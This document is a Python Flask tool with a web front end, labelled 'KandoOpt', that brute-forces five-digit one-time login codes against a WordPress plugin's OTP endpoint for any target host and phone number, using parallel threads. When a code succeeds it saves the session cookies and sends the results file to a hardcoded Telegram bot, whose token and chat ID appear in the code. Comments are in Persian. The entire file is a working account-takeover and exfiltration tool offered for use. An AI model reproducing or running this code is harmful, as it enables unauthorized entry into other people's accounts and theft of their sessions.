import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app)

# تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"  # توکن رباتت رو اینجا بذار
TELEGRAM_CHAT_ID = "102046811"     # آیدی چتت رو اینجا بذار

def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            print(f"File {file_path} sent to Telegram successfully!")
        else:
            print(f"Failed to send file to Telegram: {response.text}")

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status()

            try:
                json_response = response.json()
                if json_response.get("success"):
                    socketio.emit('update_result', {'status': 'success', 'code': code_str, 'message': json_response["data"]["message"], 'redirect': json_response["data"]["redirect"]})
                    print(f"Success with code {code_str} (number {counter})!")
                    print("Message:", json_response["data"]["message"])
                    print("Redirect to:", json_response["data"]["redirect"])

                    # ذخیره کوکی‌ها
                    cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                    for cookie in response.cookies:
                        cookie_jar.set_cookie(cookie)
                    cookie_jar.save(ignore_discard=True, ignore_expires=True)
                    print(f"Cookies saved in cookies_success_{code_str}.txt")

                    # ساخت فایل خروجی با اطلاعات
                    output_file = f"success_{code_str}.txt"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(f"Success with code: {code_str} (number {counter})\n")
                        f.write(f"Message: {json_response['data']['message']}\n")
                        f.write(f"Redirect to: {json_response['data']['redirect']}\n")
                        f.write(f"Cookies file: cookies_success_{code_str}.txt\n")
                    print(f"Output saved in {output_file}")

                    # ارسال فایل به تلگرام
                    send_file_to_telegram(output_file)
                    return True
                else:
                    socketio.emit('update_result', {'status': 'failed', 'code': code_str, 'message': json_response})
                    print(f"Failed with code {code_str} (number {counter}): {json_response}")
                    return False
            except json.JSONDecodeError:
                socketio.emit('update_result', {'status': 'error', 'code': code_str, 'message': 'JSON decode error'})
                print(f"Error parsing JSON for code {code_str} (number {counter})")
                print(f"Server response text: {response.text}")
                return False

        except requests.exceptions.RequestException as e:
            socketio.emit('update_result', {'status': 'error', 'code': code_str, 'message': str(e)})
            print(f"Network error with code {code_str} (number {counter}), attempt {attempt + 1}/{max_retries + 1}: {str(e)}")
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>KandoOpt</title>
        <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    </head>
    <body class="bg-gray-100">
        <div class="container mx-auto p-4">
            <h1 class="text-2xl font-bold mb-4">KandoOpt</h1>
            <form id="startForm" class="bg-white p-6 rounded-lg shadow-md">
                <div class="mb-4">
                    <label class="block text-gray-700">Host:</label>
                    <input type="text" id="host" name="host" class="w-full p-2 border rounded">
                </div>
                <div class="mb-4">
                    <label class="block text-gray-700">Login OTP Nonce:</label>
                    <input type="text" id="login_otp_nonce" name="login_otp_nonce" class="w-full p-2 border rounded">
                </div>
                <div class="mb-4">
                    <label class="block text-gray-700">Mobile:</label>
                    <input type="text" id="mobile" name="mobile" class="w-full p-2 border rounded">
                </div>
                <div class="mb-4">
                    <label class="block text-gray-700">Connections:</label>
                    <input type="number" id="connections" name="connections" class="w-full p-2 border rounded">
                </div>
                <div class="mb-4">
                    <label class="block text-gray-700">Range:</label>
                    <div class="flex space-x-2">
                        <input type="number" id="start_range" name="start_range" class="w-1/2 p-2 border rounded" placeholder="Start">
                        <input type="number" id="end_range" name="end_range" class="w-1/2 p-2 border rounded" placeholder="End">
                    </div>
                </div>
                <button type="submit" class="bg-blue-500 text-white p-2 rounded">Start</button>
                <button type="button" id="stopBtn" class="bg-red-500 text-white p-2 rounded">Stop</button>
            </form>
            <div id="results" class="mt-6">
                <h2 class="text-xl font-bold mb-2">Results</h2>
                <div id="resultList" class="bg-white p-4 rounded-lg shadow-md"></div>
            </div>
        </div>
        <script>
            const socket = io();
            const resultList = document.getElementById('resultList');

            socket.on('update_result', function(data) {
                const resultItem = document.createElement('div');
                resultItem.className = 'mb-2 p-2 border-b';
                if (data.status === 'success') {
                    resultItem.innerHTML = `
                        <strong>Success!</strong> Code: ${data.code}<br>
                        Message: ${data.message}<br>
                        Redirect: ${data.redirect}
                    `;
                } else if (data.status === 'failed') {
                    resultItem.innerHTML = `
                        <strong>Failed!</strong> Code: ${data.code}<br>
                        Message: ${JSON.stringify(data.message)}
                    `;
                } else if (data.status === 'error') {
                    resultItem.innerHTML = `
                        <strong>Error!</strong> Code: ${data.code}<br>
                        Message: ${data.message}
                    `;
                } else if (data.status === 'finished') {
                    resultItem.innerHTML = `
                        <strong>Finished:</strong> ${data.message}
                    `;
                }
                resultList.appendChild(resultItem);
            });

            document.getElementById('startForm').addEventListener('submit', function(e) {
                e.preventDefault();
                const host = document.getElementById('host').value;
                const login_otp_nonce = document.getElementById('login_otp_nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;
                const start_range = document.getElementById('start_range').value;
                const end_range = document.getElementById('end_range').value;

                fetch('/start', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ host, login_otp_nonce, mobile, connections, start_range, end_range }),
                });
            });

            document.getElementById('stopBtn').addEventListener('click', function() {
                fetch('/stop', {
                    method: 'POST',
                });
            });
        </script>
    </body>
    </html>
    '''

@app.route('/start', methods=['POST'])
def start():
    data = request.json
    host = data['host']
    login_otp_nonce = data['login_otp_nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    start_range = int(data['start_range'])
    end_range = int(data['end_range'])

    batch_size = connections

    found_success = False
    for batch_start in range(start_range, end_range, batch_size):
        if found_success:
            break

        batch_end = min(batch_start + batch_size, end_range)
        codes = [generate_code(i) for i in range(batch_start, batch_end)]

        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = {
                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
                for idx, code in enumerate(codes)
            }

            for future in futures:
                try:
                    if future.result():
                        found_success = True
                        break
                except Exception as e:
                    print(f"Exception in future for code {batch_start + futures[future] + 1}: {str(e)}")

        if not found_success:
            time.sleep(1)

    if not found_success:
        socketio.emit('update_result', {'status': 'finished', 'message': f"No successful code found in range {start_range:05d}-{end_range:05d}."})
        print(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
    else:
        socketio.emit('update_result', {'status': 'finished', 'message': "Process stopped because a successful code was found!"})
        print("Process stopped because a successful code was found!")

    return jsonify({'status': 'finished'})

@app.route('/stop', methods=['POST'])
def stop():
    # اینجا می‌تونیم عملیات توقف رو پیاده‌سازی کنیم
    return jsonify({'status': 'stopped'})

if __name__ == '__main__':
    socketio.run(app, debug=True)
